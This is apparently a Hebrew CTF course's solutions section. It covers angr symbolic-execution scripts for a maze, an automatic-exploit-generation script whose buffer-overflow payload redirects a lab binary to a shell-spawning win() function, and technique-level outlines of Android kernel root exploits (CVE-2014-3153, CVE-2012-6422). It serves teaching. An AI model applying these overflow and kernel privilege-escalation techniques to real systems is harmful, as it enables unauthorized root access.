## פתרון - מפת גישה לאתגרים הקשים

נעבור תרגיל אחרי תרגיל. עבור הדגמות ה-angr (תרגילים 3 ו-4) יש כאן סקריפט מלא ורץ. עבור אתגרי ה-CVE וה-device (תרגיל 5) הפתרון הוא מחקר ותוכנית ברמת הטכניקה, בדיוק כמו שחוקר אמיתי היה כותב - בלי לזייף offsets של קרנל שלא ראינו.

### פתרון תרגיל 1 - טריאז' מהריקון

1. **משפחת הטכניקה**: שילוב של שתי משפחות, ושתי הראיות נפרדות. הראיה הראשונה, בשורת ה-`file`, היא `MIPS` - כלומר ארכיטקטורה זרה, המשפחה של mipstake (פרק 8). הראיה השנייה, בשורות ה-`strings` (`Left or Right?`, `You lose`, `Correct! flag:`), היא דפוס של מבוך ועץ החלטות - המשפחה של maze ו-hunter (הרצה סימבולית עם angr). אז זה אתגר מבוך על MIPS.
2. **הפרק והכלים**: פרק 8 (ARM ו-MIPS) לחלק הארכיטקטורה, ו-angr לחלק המבוך. כלי הריצה והניפוי הם `qemu-mips` להרצה ו-`gdb-multiarch` לניפוי, כי אין לכם מעבד MIPS מקומי.
3. **הצעד הראשון הקונקרטי**: מריצים תחת האמולטור כדי לראות מה התוכנית עושה בכלל:

```bash
qemu-mips -L /usr/mips-linux-gnu ./chall
```

ובמקביל פותחים את הבינארי בדיסאסמבלר כדי לאתר את הכתובות של "You win"/"flag" ו-"You lose", שיהיו ה-`find` וה-`avoid` של angr (angr יודע לעבוד גם על MIPS).

למה זה עבד: הריקון לבדו, בלי לקרוא שורת קוד אחת, כבר מיין את האתגר לשתי משפחות מוכרות והצביע על שני כלים. זו כל המטרה של הטריאז'.

### פתרון תרגיל 2 - תוכנית ניתוח לפי תבנית

הנה שלוש תוכניות לדוגמה, אחת מכל טיפוס. כך תוכנית טובה נראית:

תוכנית א' - maze:

```text
שם האתגר: maze
קטגוריה: Grotesque
משפחת טכניקה: הרצה סימבולית (angr)
פרק בקורס: הכלי angr מהפרק הנוכחי (9.4)
הגנות/סביבה משוערות: לא רלוונטי - זה אתגר לוגי, לא קורפשן זיכרון
השערת הבאג: אין באג זיכרון. הקושי הוא מרחב חיפוש אקספוננציאלי של מסלולים
שלושת הצעדים הראשונים:
  1. objdump -d ./maze ; מוצאים כתובות של "win" ו-"lose"
  2. כותבים סקריפט angr עם explore(find=WIN, avoid=LOSE)
  3. מזינים את posix.dumps(0) חזרה לתוכנית
הכלים: angr, objdump
תנאי ניצחון: התוכנית מדפיסה את הדגל / "You win"
```

תוכנית ב' - towelroot (Hacker's Secret):

```text
שם האתגר: towelroot
קטגוריה: Hacker's Secret
משפחת טכניקה: שחזור חולשת קרנל אמיתית (device CVE)
פרק בקורס: פרק 9 (ניצול קרנל) + מחקר CVE
הגנות/סביבה משוערות: קרנל אנדרואיד בגרסה פגיעה; offsets תלויי גרסה
השערת הבאג: לא השערה - חולשה מתועדת. CVE-2014-3153 ב-FUTEX_REQUEUE
שלושת הצעדים הראשונים:
  1. קוראים את ה-CVE ואת הכתיבה של geohot
  2. מזהים את הפרימיטיב (קורפשן מבנה על מחסנית הקרנל)
  3. מתאימים offsets לגרסת הקרנל של האתגר
הכלים: מחקר (NVD, PoC ציבורי), מהדר קרוס, gdb לקרנל
תנאי ניצחון: מקבלים uid=0 (root) וקוראים את הדגל
```

תוכנית ג' - softmmu (Hacker's Secret):

```text
שם האתגר: softmmu
קטגוריה: Hacker's Secret
משפחת טכניקה: באג באמולטור (MMU תוכנתי)
פרק בקורס: פרק 8 (מפרשים ומכונות וירטואליות) + בטיחות זיכרון
הגנות/סביבה משוערות: userland; ההגנות של הבינארי המארח (checksec רגיל)
השערת הבאג: OOB בפונקציית תרגום הכתובת - כתובת גיסט שמתורגמת מחוץ לזיכרון המארח
שלושת הצעדים הראשונים:
  1. checksec + strings ; מזהים שזה אמולטור (opcodes, "CPU", "memory")
  2. RE של פונקציית התרגום (guest addr -> host addr)
  3. מחפשים איפה חסרה בדיקת גבולות בתרגום
הכלים: Ghidra/IDA, gdb, pwntools
תנאי ניצחון: r/w בזיכרון המארח -> חטיפת זרימה -> shell
```

למה זה עבד: התבנית מכריחה אתכם לענות על "מה החולשה" ו"מה הצעד הראשון" **לפני** שאתם מבזבזים שעות בכיוון לא נכון. שימו לב שהשדה "השערת הבאג" שונה מהותית בין הטיפוסים: במבוך אין באג, ב-CVE הוא כבר ידוע, ובאמולטור הוא כמעט תמיד באותו מקום (התרגום).

### פתרון תרגיל 3 - להריץ angr על מבוך אמיתי

קודם מוצאים את הכתובות. הדרך הנוחה: פותחים ב-pwndbg, מאתרים את המחרוזת `"You win"` ב-`.rodata`, ורואים מאיזו כתובת ב-`main` טוענים אותה ל-`rdi` לפני ה-`call puts`. אפשר גם ישירות מהדיסאסמבלי:

```bash
$ objdump -d ./maze | grep -i -B3 'call.*puts'
```

מצליבים את כתובת המחרוזת שנטענת ל-`rdi` בכל בלוק, ומזהים איזה `call puts` שייך ל-"You win" ואיזה ל-"You lose". נניח שמצאנו:

```text
WIN  (הבלוק שמדפיס "You win")  -> 0x40122e
LOSE (הבלוק שמדפיס "You lose") -> 0x401212
```

עכשיו הסקריפט:

```python
#!/usr/bin/env python3
import angr

WIN  = 0x40122e
LOSE = 0x401212

proj  = angr.Project('./maze', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

simgr.explore(find=WIN, avoid=LOSE)

if simgr.found:
    sol = simgr.found[0]
    data = sol.posix.dumps(0)
    print('solution stdin =', data)
else:
    print('no path found - check WIN/LOSE addresses')
```

הרצה:

```text
$ python3 solve_maze.py
WARNING | ... auto_load_libs disabled ...
solution stdin = b'rrrdddud'
```

מאמתים ידנית:

```text
$ printf 'rrrdddud' | ./maze
Navigate the maze (8 moves: u/d/l/r):
You win
```

הפתרון `rrrdddud` הוא באמת מסלול תקין מ-(0,0) ל-(3,3): שלושה צעדים ימינה ושלושה למטה מגיעים ל-(3,3), ואז צעד מעלה וצעד מטה שחוזרים לאותה משבצת וממלאים את שני המהלכים הנותרים - בלי לצאת מהלוח. angr מצא אותו בלי שכתבנו שום לוגיקת מבוך.

למה זה עבד: angr הריץ את `main` עם 8 בתי stdin סימבוליים. כל השוואה (`m == 'u'`, בדיקות הגבול) הוסיפה אילוץ. `explore(find, avoid)` חקר את המסלולים עד שהגיע ל-`WIN`, ואז הפותר נתן ערך קונקרטי ל-8 הבתים שמספק את כל האילוצים של אותו מסלול. איך להכליל: זה בדיוק מה שעושים ל-maze ול-hunter האמיתיים, רק שהכתובות אמיתיות ומספר המהלכים גדול יותר.

### פתרון תרגיל 4 - שלד AEG על גלישה פשוטה

מוצאים את כתובת `win`:

```bash
$ nm ./vuln | grep ' win'
0000000000401156 T win
```

הסקריפט שמוצא לבד את השליטה ב-`pc` ובונה מטען:

```python
#!/usr/bin/env python3
import angr, claripy

WIN = 0x401156

proj = angr.Project('./vuln', auto_load_libs=False)

sym_stdin = claripy.BVS('stdin', 8 * 100)          # 100 בתים סימבוליים
state = proj.factory.full_init_state(
    stdin=sym_stdin,
    add_options=angr.options.unicorn,
)

simgr = proj.factory.simulation_manager(state, save_unconstrained=True)

# מריצים עד שנמצא מצב שבו אנחנו שולטים ב-pc
while not simgr.unconstrained and (simgr.active or simgr.deferred):
    simgr.step()

assert simgr.unconstrained, 'no unconstrained state - increase symbolic length'
crash = simgr.unconstrained[0]

# מאלצים את ה-pc הסימבולי לכתובת win ומחלצים את הקלט
crash.add_constraints(crash.regs.pc == WIN)
assert crash.satisfiable()

payload = crash.posix.dumps(0)
open('payload.bin', 'wb').write(payload)
print('payload len =', len(payload))
print(payload)
```

הרצה:

```text
$ python3 aeg.py
payload len = 48
b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaV\x11@\x00\x00\x00\x00\x00'
```

הכלי angr מצא לבד ש-40 הבתים הראשונים ממלאים את `buf[32]` ואת `saved rbp`, ואז הזריק את כתובת `win` (`0x401156`) לכתובת החזרה. מאמתים עם pwntools:

```python
from pwn import *
p = process('./vuln')
p.sendline(open('payload.bin', 'rb').read())
p.interactive()      # מגיעים ל-win -> system("/bin/sh")
```

```text
$ python3 verify.py
[+] Starting local process './vuln'
$ id
uid=1000(user) gid=1000(user) ...
```

למה זה עבד: הדגל `save_unconstrained=True` גרם ל-angr לשמור בצד כל מצב שבו ה-`pc` נעשה סימבולי - כלומר הקלט זרם ל-`rip`. הלולאה רצה עד שנוצר מצב כזה. אז הוספנו אילוץ יחיד, `pc == win`, והפותר החזיר את הקלט המדויק שגם עולה על החוצץ וגם מציב את `win` ב-`rip`. איך להכליל: זה הגרעין של AEG. באתגר aeg האמיתי עוטפים את זה בלולאה על הבינארים הנכנסים, מוסיפים זיהוי הגנות, ולעיתים `angrop` לבניית ROP כשאין `win` נוח. אבל הרעיון - "חכה ל-pc בלתי מאולץ, אלץ אותו, פתור" - זהה.

הערה מעשית: אם על המערכת שלכם הלולאה לא מסתיימת, זה בדרך כלל כי הקלט הסימבולי קצר מכדי להגיע ל-`rip`, או כי `gets` לא ממודל טוב בגרסת angr שלכם - הגדילו את האורך או השתמשו בבינארי עם `read(0, buf, 100)` במקום `gets`.

### פתרון תרגיל 5 - מחקר CVE בכתב

דף מחקר לדוגמה עבור **towelroot**:

1. **ה-CVE**: מדובר ב-CVE-2014-3153, שפורסם ב-2014. התגלה ונוצל לרוט על ידי geohot בכלי בשם towelroot, שרוטט מספר עצום של מכשירי אנדרואיד.
2. **הפרימיטיב**: באג בקריאת המערכת `futex`, בנתיב של הפעולה `FUTEX_REQUEUE`. טיפול שגוי בהעברת ממתינים בין תורי futex מוביל לכך שמבנה `waiter` שיושב על מחסנית הקרנל נשאר משורשר אחרי שהמסגרת שלו כבר שוחררה. קורפשן המבנה הזה הופכת בסופו של דבר לכתיבה לכתובת נשלטת בזיכרון הקרנל.
3. **שלושת השלבים העיקריים**: ראשית, מסדרים את מבני ה-futex כך שהבאג יוצר מצביע תלוי (dangling) לזיכרון קרנל שאנחנו שולטים בתוכנו. שנית, ממנפים את הכתיבה הנשלטת כדי לשנות מבנה קריטי - בדרך כלל את מבנה ה-`cred` של התהליך (מאפסים `uid`/`gid`) או משנים מצביע פונקציה בקרנל. שלישית, חוזרים ל-userland כתהליך עם הרשאות root וקוראים את הדגל.
4. **האילוץ הסביבתי**: החולשה תלוית גרסת קרנל. ה-offsets של השדות במבנים (למשל המיקום של `uid` בתוך `cred`) ושל הפונקציות משתנים בין גרסאות, ולכן ה-exploit חייב להיות מכוון לגרסה המדויקת שהאתגר מריץ. זו הסיבה שהשלב הראשון במחקר הוא לזהות את גרסת הקרנל (`uname -r`) ולהתאים אליה את המספרים.

הנקודה החשובה: לא המצאנו כלום. זיהינו חולשה מפורסמת, קראנו את המקורות, ותיארנו את הפרימיטיב ואת השרשרת ברמת הטכניקה. שחזור מדויק דורש גישה לגרסת הקרנל של האתגר ולהתאמת ה-offsets - וזה בדיוק סוג העבודה שאתגרי Hacker's Secret מתרגלים: קריאה ושחזור של מחקר קיים, לא המצאה מאפס.

למה זה עבד: אתגרי device CVE אינם "פאזל" - הם תרגיל בביבליוגרפיה טכנית. חוקר שיודע לזהות את החולשה, למצוא את הפרסום המקורי ואת ה-PoC, ולהבין את הפרימיטיב, כבר עשה 80 אחוז מהעבודה. אותו תהליך בדיוק חל על exynos: מזהים את CVE-2012-6422, קוראים את הפרסום על `/dev/exynos-mem`, ומבינים שהפרימיטיב הוא `mmap` של זיכרון פיזי שרירותי מ-userland, שהופך לכתיבה ישירה לזיכרון הקרנל.

### פתרון תרגיל 6 (בונוס) - הגבולות של angr

מגדילים את המבוך ל-40 מהלכים ולוח 10x10 ומריצים שוב:

1. **הזמן**: התלות היא אקספוננציאלית. עם 8 מהלכים ו-4 כיוונים יש עד `4^8` מסלולים (כ-65 אלף), ו-angr טוחן אותם בשניות. עם 40 מהלכים יש עד `4^40` מסלולים - מספר אסטרונומי. בפועל הסקריפט או שירוץ דקות ארוכות, או שיאכל את כל ה-RAM ויקרוס בלי לסיים.
2. **מה קורה - התפוצצות מצבים**: כל צומת החלטה מכפיל את מספר המצבים ש-angr מנהל במקביל. זה נקרא state explosion: מספר המסלולים הפעילים גדל אקספוננציאלית עם עומק ההסתעפות, וגם הזיכרון וגם הזמן מתפוצצים. angr לא "טיפש" - הבעיה מובנית בהרצה סימבולית של מרחב חיפוש גדול.
3. **רעיון לצמצום**: כמה כיוונים אפשריים. אפשר לתת `avoid` נדיב יותר - לזהות מוקדם מסלולים שיצאו מהלוח ולגזום אותם מיד, כך שלא יתפצלו הלאה. אפשר להשתמש בטכניקת חיפוש ממוקדת יותר (למשל `DFS` במקום ברירת המחדל, שמחזיק פחות מצבים בזיכרון בו-זמנית). ואפשר, כמו שעושים באתגרים אמיתיים, לא לזרוק את כל הבינארי על angr: פותרים ידנית עד קרוב ליעד, מקימים `state` מכתובת מתקדמת עם `proj.factory.blank_state(addr=...)`, ומפעילים angr רק על הקטע הקצר שנשאר.

למה זה עבד: הבנת המגבלה היא חלק מהכלי. angr מבריק על מבוכים קטנים-בינוניים ועל בינארים ממוקדים, אבל הוא לא פותר קסם כל בעיה. הידיעה מתי angr יעזור ומתי הוא יתפוצץ - ומתי לשלב אותו עם ניתוח ידני - היא בדיוק ההבדל בין מי שקרא על הכלי לבין מי שיודע להשתמש בו על אתגר Grotesque אמיתי.
